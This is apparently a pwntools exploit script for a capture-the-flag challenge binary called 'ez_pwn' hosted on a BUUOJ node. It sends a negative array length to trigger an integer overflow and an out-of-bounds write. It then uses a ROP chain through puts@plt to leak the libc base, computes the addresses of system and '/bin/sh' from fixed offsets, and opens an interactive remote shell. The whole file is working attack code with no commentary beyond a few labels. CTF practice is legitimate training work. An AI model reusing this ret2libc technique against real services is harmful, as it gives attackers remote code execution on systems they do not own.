from pwn import *
context.arch = 'i386'
context.os = 'linux'
context.log_level = 'DEBUG'


# sh = process(['./ez_pwn'])
sh = remote('node4.buuoj.cn', 28293)
elf = ELF('./ez_pwn')


def add_num(num: int):
    sh.sendlineafter(b"input your choice:", b"1")
    sh.sendlineafter(b"input num", str(num).encode())


def pwn():
    sh.recvuntil(b"length of array:")
    sh.sendline(b"-2147483648")
    for _ in range(10):
        add_num(1)
    add_num(1000)  # Arr length check
    add_num(1)
    add_num(17)  # Arr index


puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
hackme_addr = 0x8049216


pwn()

add_num(puts_plt)
add_num(hackme_addr)
add_num(puts_got)
sh.sendlineafter(b"input your choice:", b'4')
sh.recvuntil(b"exit!\n")

puts_addr = u32(sh.recv(4).ljust(4, b'\x00'))
libc_base = puts_addr - 0x67560
system_addr = libc_base + 0x3cf10
bin_sh_addr = libc_base + 0x17b9db


pwn()
print(">>>>> system_addr", hex(system_addr), system_addr)
print(">>>>> binsh_addr", hex(bin_sh_addr), bin_sh_addr)
print(">>>>> puts_addr", hex(puts_addr))
print(">>>>> libc_addr", hex(libc_base))

add_num(signed(system_addr))
add_num(hackme_addr)
add_num(signed(bin_sh_addr))
sh.sendlineafter(b"input your choice:", b'4')

sh.interactive()

